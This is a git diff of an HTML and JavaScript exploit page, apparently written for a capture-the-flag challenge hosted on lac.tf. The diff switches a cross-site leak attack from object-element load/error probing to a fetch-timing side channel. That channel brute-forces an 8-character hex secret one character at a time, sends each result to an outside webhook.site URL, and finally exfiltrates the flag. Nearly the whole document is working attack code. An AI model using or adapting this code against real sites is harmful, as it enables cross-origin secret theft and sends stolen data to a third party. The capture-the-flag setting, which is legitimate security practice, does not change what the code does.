@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak Object</title></head>
+<head><title>XS-Leak Flag Timing</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
@@ -8,99 +8,74 @@ var TARGET = "https://append-note-hfskv.instancer.lac.tf";
 var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";
 var CHARS = "0123456789abcdef";
 
-navigator.sendBeacon(WEBHOOK, "OBJ_V1");
+navigator.sendBeacon(WEBHOOK, "FLAG_TIMING_V1");
 
 function report(d) {
     navigator.sendBeacon(WEBHOOK, d);
-    new Image().src = WEBHOOK + "?m=" + encodeURIComponent(d);
 }
 function setStatus(s) { document.getElementById('s').textContent = s; }
 
-// Test using object element
-function testChar(prefix, c) {
-    return new Promise(function(resolve) {
-        var url = TARGET + "/append?content=" + encodeURIComponent(prefix + c) + "&url=" + encodeURIComponent(TARGET + "/");
-        
-        var obj = document.createElement('object');
-        obj.data = url;
-        obj.style.position = 'absolute';
-        obj.style.left = '-9999px';
-        
+// Measure timing for /flag?secret=X with high precision
+async function measureFlag(secret) {
+    var url = TARGET + "/flag?secret=" + encodeURIComponent(secret);
+    
+    var times = [];
+    var samples = 5;
+    
+    for (var i = 0; i < samples; i++) {
         var start = performance.now();
-        var resolved = false;
-        
-        obj.onload = function() {
-            if (!resolved) {
-                resolved = true;
-                var elapsed = performance.now() - start;
-                try { document.body.removeChild(obj); } catch(e) {}
-                resolve({ c: c, status: 'load', time: elapsed });
-            }
-        };
-        
-        obj.onerror = function() {
-            if (!resolved) {
-                resolved = true;
-                var elapsed = performance.now() - start;
-                try { document.body.removeChild(obj); } catch(e) {}
-                resolve({ c: c, status: 'error', time: elapsed });
-            }
-        };
-        
-        document.body.appendChild(obj);
-        
-        setTimeout(function() {
-            if (!resolved) {
-                resolved = true;
-                try { document.body.removeChild(obj); } catch(e) {}
-                resolve({ c: c, status: 'timeout', time: 5000 });
-            }
-        }, 5000);
-    });
+        try {
+            await fetch(url, { mode: 'cors' });
+        } catch(e) {}
+        var elapsed = performance.now() - start;
+        times.push(elapsed);
+    }
+    
+    // Use median
+    times.sort(function(a,b) { return a - b; });
+    return times[Math.floor(samples / 2)];
 }
 
-function testPosition(prefix) {
-    var promises = [];
+// Test each char at position
+async function testPosition(prefix) {
+    var results = [];
+    
     for (var i = 0; i < CHARS.length; i++) {
-        promises.push(testChar(prefix, CHARS[i]));
+        var c = CHARS[i];
+        var test = prefix + c + "0".repeat(7 - prefix.length);  // Pad to 8 chars
+        var time = await measureFlag(test);
+        results.push({ c: c, time: time });
     }
-    return Promise.all(promises);
+    
+    return results;
 }
 
 async function main() {
     report('START');
-    setStatus('Testing with object...');
+    setStatus('Testing flag timing...');
     
     try {
         var secret = "";
         
         for (var p = 0; p < 8; p++) {
             setStatus('P' + p + '...');
+            
             var results = await testPosition(secret);
             
-            var loads = results.filter(function(r) { return r.status === 'load'; });
-            var errors = results.filter(function(r) { return r.status === 'error'; });
+            // Sort by time (longer = more chars matched due to short-circuit comparison)
+            results.sort(function(a,b) { return b.time - a.time; });
             
-            report('P' + p + ':L=' + loads.length + ',E=' + errors.length);
+            var top3 = results.slice(0, 3).map(function(r) { return r.c + ':' + r.time.toFixed(1); }).join(',');
+            report('P' + p + ':' + top3);
             
-            var detail = results.map(function(r) { return r.c + ':' + r.status[0] + Math.round(r.time); }).join(',');
-            report('P' + p + 'D:' + detail);
-            
-            if (errors.length === 1) {
-                secret += errors[0].c;
-            } else if (loads.length === 1) {
-                secret += loads[0].c;
-            } else {
-                // Pick by timing
-                results.sort(function(a,b) { return a.time - b.time; });
-                secret += results[0].c;
-            }
-            
+            // Pick slowest (more matching)
+            secret += results[0].c;
             report('P' + p + '=' + secret);
         }
         
         report('SEC:' + secret);
         
+        // Verify
         var resp = await fetch(TARGET + '/flag?secret=' + secret);
         var flag = await resp.text();
         report('FLAG:' + flag);
